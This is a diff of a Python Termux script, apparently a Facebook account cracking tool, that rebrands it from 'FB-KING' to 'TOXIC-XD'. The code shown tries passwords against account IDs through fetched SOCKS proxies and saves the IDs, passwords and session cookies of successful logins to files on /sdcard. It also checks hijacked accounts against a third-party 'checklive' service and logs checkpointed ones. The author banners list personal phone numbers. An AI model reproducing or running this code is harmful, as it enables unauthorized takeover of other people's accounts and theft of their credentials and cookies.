@@ -1,6 +1,6 @@
-#Coded By FB-KING (Mahin Ahmed)
-#Facebook : Mahin Ahmed 
-#Github : FB-KING 
+#Coded By TOXIC-XD (Supraj Shrestha)
+#Facebook : SUPRAJ SHRESTHA 
+#Github : TOXIC-XD 
 
 ###----------[ IMPORT MODULE ]----------###
 import requests,json,os,sys,random,datetime,time,re,platform,string,bs4,zlib,base64,subprocess
@@ -26,7 +26,7 @@ def check_permission():
 			return True
 	else:
 		return True
-file_path = "/sdcard/KING-Gmail-ids-with-Cookies.txt"
+file_path = "/sdcard/TOXIC-Gmail-ids-with-Cookies.txt"
 
 try:
 	if not os.path.exists(file_path):
@@ -56,7 +56,7 @@ tokene, akune = [],[]
 sandine, sandina = [],[]
 method, ugen = [],[]
 #king script 
-sys.stdout.write('\x1b]2; (FB-KING Tools) \x07')
+sys.stdout.write('\x1b]2; (TOXIC-XD Tools) \x07')
 try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
 	open('.proxy.txt','w').write(prox)
@@ -179,17 +179,17 @@ def banner2():
 {B} / __/ / /_/ /_____/ /| |_/ // /|  / /_/ /  
 {H}/_/   /_____/     /_/ |_/___/_/ |_/\____/                                              
 {RED}╔════════════════════════════════════════╗
-{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} FB-KING                 {GREEN}║
-{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}Mahin Ahmed             {GREEN}║
-{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+8801841004250          {GREEN}║
-{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/FB-KING    {GREEN}  ║
+{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} TOXIC-XD                {GREEN}║
+{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}SUPRAJ SHRESTHA         {GREEN}║
+{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+9779840007310          {GREEN}║
+{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/SUPRAJ-8   {GREEN}  ║
 {GREEN}║{K}[{H}•{K}] {P}Status    {RED}: {H}Premium      {GREEN}           ║
 {GREEN}║{K}[{H}•{K}] {P}Network  {RED} : {RED}({H}3G{M}/{H}4G{M}/{H}5G{RED}) {H}ON{GREEN} {RED}({H}Wifi{RED})  {GREEN}  ║
 {GREEN}║{K}[{H}•{K}] {P}Version{RED}   : {H}{vsn} {GREEN}                  ║
-{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}KING{RED}-{H}PRO      {GREEN}          ║
+{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}TOXIC{RED}-{H}PRO      {GREEN}          ║
 {RED}╚════════════════════════════════════════╝ {P}
  {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
- {K}[{H}√{K}]{P}     {H} Enjoy {warna}KING-PRO{N}{H} User 
+ {K}[{H}√{K}]{P}     {H} Enjoy {warna}TOXIC-PRO{N}{H} User 
  {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""");print(led)
 def banner():
 	if "linux" in sys.platform.lower():
@@ -201,23 +201,23 @@ def banner():
 	else:
 		try:os.system("clear")
 		except:pass
-	print(f"""{H}    __________        __ __ _____   ________
-{K}   / ____/ __ )      / //_//  _/ | / / ____/
-{RED}  / /_  / __  |_____/ ,<   / //  |/ / / __  
-{B} / __/ / /_/ /_____/ /| |_/ // /|  / /_/ /  
-{H}/_/   /_____/     /_/ |_/___/_/ |_/\____/                                              
+	print(f"""{H}   \\033[1;91m_____ _____  _____ ____ 
+\\033[1;92m|_   _/ _ \\ \\/ |_ _/ ___|
+\\033[1;93m  | || | | \\  / | | |    
+\\033[1;94m  | || |_| /  \\ | | |___ 
+\\033[1;95m  |_| \\___/_/\\_|___\\____|VERSION:\\u001b[36m V7\\033[1;37m                                             
 {RED}╔════════════════════════════════════════╗
-{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} FB{RED}-{H}KING                 {GREEN}║
-{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}Mahin Ahmed             {GREEN}║
-{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+8801841004250          {GREEN}║
-{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/FB-KING    {GREEN}  ║
+{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} TOXIC{RED}-{H}XD                {GREEN}║
+{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}SUPRAJ SHRESTHA         {GREEN}║
+{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+9779840007310          {GREEN}║
+{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/SUPRAJ-8   {GREEN}  ║
 {GREEN}║{K}[{H}•{K}] {P}Status    {RED}: {H}Premium      {GREEN}           ║
 {GREEN}║{K}[{H}•{K}] {P}Network  {RED} : {RED}({H}3G{M}/{H}4G{M}/{H}5G{RED}) {H}ON{GREEN} {RED}({H}Wifi{RED})  {GREEN}  ║
 {GREEN}║{K}[{H}•{K}] {P}Version{RED}   : {H}{vsn}{H} ‌‌‌‍• {GREEN}                ║
-{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}KING{RED}-{H}PRO      {GREEN}          ║
+{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}TOXIC{RED}-{H}PRO      {GREEN}          ║
 {RED}╚════════════════════════════════════════╝ {P}
  {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
- {K}[{H}√{K}]{P}     {H} Enjoy {warna}KING-PRO{N}{H} User 
+ {K}[{H}√{K}]{P}     {H} Enjoy {warna}TOXIC-PRO{N}{H} User 
  {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""");print(led);print(f'{gen}Key {RED}: {A}{BN}{mpm}{N}');print(led)
 cxp = 'c'+'o'+'n'+'t'+'r'+'olex'+'xp'
 mpk = 'o'+'g'+'s'+'p'+'ot'
@@ -261,18 +261,18 @@ file_name = ".name.txt"
 if os.path.exists(file_name):
 	with open(file_name, "r") as f:
 		saved_name = f.read().strip()
-	banner();print(f"{dot}Welcome back {M}: {H}{saved_name}{P}{M}!");time.sleep(2)
+	banner();print(f"{dot}Welcome back {M}: {H}{saved_name}{P}{M}!");time.sleep(4)
 else:
 	banner()
 	regs = input(f'{dot} Name For registration {M}:{H} ')
 	with open(file_name, "w") as f:
 		f.write(regs)
 	banner()
-	adt = f"Hi%20FB-KING%20Owner%20My%20Reg%20name%20is%20:%20{regs}"
+	adt = f"Hi%20TOXIC-XD%20Owner%20My%20Reg%20name%20is%20:%20{regs}"
 	os.system(f'termux-open {xsbxd}{adt}')
 	sys.exit()
 #key
-xkey="KING="+xp[:8]
+xkey="TOXIC="+xp[:8]
 kxd = str(xp[:8])
 correct_password = xkey
 try:
@@ -746,13 +746,13 @@ def filem1(idf,pwv,names):
 				if 'Gmail' in gxmxl:
 					match = re.search(r'c_user=([^;]+)', kuki)
 					idf = match.group(1) if match else None
-					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
+					with open('/sdcard/TOXIC-Gmail-ids-with-Cookies.txt', 'r') as f:
 						fo = f.read()
 					if idf in fo:
-						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
 						ok+=1
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 						
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -761,7 +761,7 @@ def filem1(idf,pwv,names):
 					break
 				else:
 					ok+=1
-					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+					print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					
 					if 'y' in cokix:
 						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -770,7 +770,7 @@ def filem1(idf,pwv,names):
 					break
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -851,13 +851,13 @@ def filem2(idf,pwv,names):
 				if 'Gmail' in gxmxl:
 					match = re.search(r'c_user=([^;]+)', kuki)
 					idf = match.group(1) if match else None
-					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
+					with open('/sdcard/TOXIC-Gmail-ids-with-Cookies.txt', 'r') as f:
 						fo = f.read()
 					if idf in fo:
-						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
 						ok+=1
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 						
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -866,7 +866,7 @@ def filem2(idf,pwv,names):
 					break
 				else:
 					ok+=1
-					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+					print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					
 					if 'y' in cokix:
 						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -875,7 +875,7 @@ def filem2(idf,pwv,names):
 					break
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -956,13 +956,13 @@ def filem3(idf,pwv,names):
 				if 'Gmail' in gxmxl:
 					match = re.search(r'c_user=([^;]+)', kuki)
 					idf = match.group(1) if match else None
-					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
+					with open('/sdcard/TOXIC-Gmail-ids-with-Cookies.txt', 'r') as f:
 						fo = f.read()
 					if idf in fo:
-						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
 						ok+=1
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 						
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -971,7 +971,7 @@ def filem3(idf,pwv,names):
 					break
 				else:
 					ok+=1
-					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+					print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					
 					if 'y' in cokix:
 						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -980,7 +980,7 @@ def filem3(idf,pwv,names):
 					break
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -994,7 +994,7 @@ def filem4(idf,pwv,names):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
-	animasi = random.choice(["\x1b[1;91mKING-M4","\x1b[1;92mKING-M4","\x1b[1;93mKING-M4","\x1b[1;94mKING-M4","\x1b[1;95mKING-M4","\x1b[1;96mKING-M4","\x1b[1;97mKING-M4","\x1b[1;91mKING-M4","\x1b[1;92mKING-M4","\x1b[1;93mKING-M4","\x1b[1;94mKING-M4","\x1b[1;95mKING-M4","\x1b[1;96mKING-M4"])
+	animasi = random.choice(["\x1b[1;91mTOXIC-M4","\x1b[1;92mTOXIC-M4","\x1b[1;93mTOXIC-M4","\x1b[1;94mTOXIC-M4","\x1b[1;95mTOXIC-M4","\x1b[1;96mTOXIC-M4","\x1b[1;97mTOXIC-M4","\x1b[1;91mTOXIC-M4","\x1b[1;92mTOXIC-M4","\x1b[1;93mTOXIC-M4","\x1b[1;94mTOXIC-M4","\x1b[1;95mTOXIC-M4","\x1b[1;96mTOXIC-M4"])
 	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
 	fn = names.split(' ')[0]
 	try:
@@ -1061,13 +1061,13 @@ def filem4(idf,pwv,names):
 				if 'Gmail' in gxmxl:
 					match = re.search(r'c_user=([^;]+)', kuki)
 					idf = match.group(1) if match else None
-					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
+					with open('/sdcard/TOXIC-Gmail-ids-with-Cookies.txt', 'r') as f:
 						fo = f.read()
 					if idf in fo:
-						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
 						ok+=1
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 						
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -1076,7 +1076,7 @@ def filem4(idf,pwv,names):
 					break
 				else:
 					ok+=1
-					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+					print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'TOXIC-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					
 					if 'y' in cokix:
 						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
@@ -1085,7 +1085,7 @@ def filem4(idf,pwv,names):
 					break
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -1163,26 +1163,26 @@ def rdm1(idf,pwv,names):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				match = re.search(r'c_user=([^;]+)', kuki)
 				idf = match.group(1) if match else None
-				open('/sdcard/'+'KING-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/'+'TOXIC-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				try:
 					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
 					if 'live' in liveck:
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
 						if 'y' in apxx:
 							application_check(ses,kuki)
 						
-						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					elif 'die' in liveck:
-						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
-						open('/sdcard/'+'KING-Mix-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Mix-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				except:pass
 				break
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -1248,26 +1248,26 @@ def rdm2(idf,pwv,names):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				match = re.search(r'c_user=([^;]+)', kuki)
 				idf = match.group(1) if match else None
-				open('/sdcard/'+'KING-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/'+'TOXIC-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				try:
 					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
 					if 'live' in liveck:
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
 						if 'y' in apxx:
 							application_check(ses,kuki)
 						
-						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					elif 'die' in liveck:
-						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
 						pass
 				except:pass
 				break			
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -1343,26 +1343,26 @@ def rdm3(idf,pwv,names):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				match = re.search(r'c_user=([^;]+)', kuki)
 				idf = match.group(1) if match else None
-				open('/sdcard/'+'KING-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/'+'TOXIC-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				try:
 					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
 					if 'live' in liveck:
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
 						if 'y' in apxx:
 							application_check(ses,kuki)
 						
-						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					elif 'die' in liveck:
-						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
-						open('/sdcard/'+'KING-Temp-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Temp-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				except:pass
 				break			
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -1444,22 +1444,22 @@ def rdm4(idf,pwv,names):
 				try:
 					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
 					if 'live' in liveck:
-						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
+						print(f'{K} [{H}TOXIC-XD-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
 						if 'y' in cokix:
 							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
 						if 'y' in apxx:
 							application_check(ses,kuki)
 						
-						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					elif 'die' in liveck:
-						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 					else:
-						open('/sdcard/'+'KING-Temp-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+						open('/sdcard/'+'TOXIC-Temp-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				except:pass
 				break			
 			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
+				open('/sdcard/'+'TOXIC-CP.txt','a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			else:
@@ -1474,3 +1474,4 @@ if __name__=='__main__':
 		hack(mht)
 	except requests.exceptions.ConnectionError:banner();print(f'{rgen}Check Your Internet..');exit()
 	except:banner();print(f'{rgen}Hello Brother something wrong');exit()
+		
